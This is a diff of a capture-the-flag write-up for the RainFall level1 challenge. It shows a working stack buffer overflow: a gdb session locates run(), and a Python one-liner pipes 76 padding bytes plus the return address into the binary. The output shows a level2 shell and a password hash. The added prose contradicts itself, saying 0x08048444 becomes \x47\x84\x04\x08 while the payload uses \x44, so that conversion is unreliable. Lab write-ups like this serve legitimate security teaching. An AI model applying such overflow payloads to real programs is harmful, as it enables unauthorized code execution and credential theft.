@@ -115,16 +115,27 @@ The winning payload should look like this:
 
 > [64 bytes] + [x bytes] + [Address of `run()`]
 
-Now we need to determine the exact amount of padding needed to overflow the buffer and overwrite the return address. After a bit of trial and error, we find that the padding is 12 bytes long, which gives us the following payload following the x86 architecture:
+Now we need to determine the exact amount of padding needed to overflow the buffer and overwrite the return address. After a bit of trial and error, we find that the padding is 12 bytes long.
 
-> `'A' * 76 + 0x08048447`
-
-Where `0x08048447` is the address of the `run()` function. Importantly, the address must be in hexadecimal and little-endian format, as the system architecture is little-endian. Thus, `0x08048447` becomes `\x47\x84\x04\x08`.
-
-We can create this payload using Python:
+The exact address of `run()` can be found using gdb:
 
 ```bash
-level1@RainFall:~$ (python -c 'print("A"*76 + "\x47\x84\x04\x08")'; cat) | ./level1
+(gdb) b main
+Breakpoint 1 at 0x8048483
+(gdb) run
+Starting program: /home/user/level1/level1 
+
+Breakpoint 1, 0x08048483 in main ()
+(gdb) p run
+$1 = {<text variable, no debug info>} 0x8048444 <run>
+```
+
+Importantly, the address must be in hexadecimal and little-endian format, as the system architecture is little-endian. Thus, `0x08048444` becomes `\x47\x84\x04\x08`.
+
+We can then create the final payload using Python:
+
+```bash
+level1@RainFall:~$ (python -c 'print("A"*76 + "\x44\x84\x04\x08")'; cat) | ./level1
 Good... Wait what?
 whoami
 level2
@@ -132,4 +143,6 @@ cat /home/user/level2/.pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
 
-We have successfully created the payload with Python, piped it into the vulnerable program, and opened a shell with level2 privileges which allowed us to read the password for the next level. Note that the `cat` command is used to keep the input stream open after the payload is sent, allowing us to interact with the spawned shell; without it, the shell would close immediately after executing the payload.
+We have successfully created the payload with Python, piped it into the vulnerable program, and opened a shell with level2 privileges which allowed us to read the password for the next level. This is a classical attack via a stack buffer overflow.
+
+Note that the `cat` command is used to keep the input stream open after the payload is sent, allowing us to interact with the spawned shell; without it, the shell would close immediately after executing the payload.
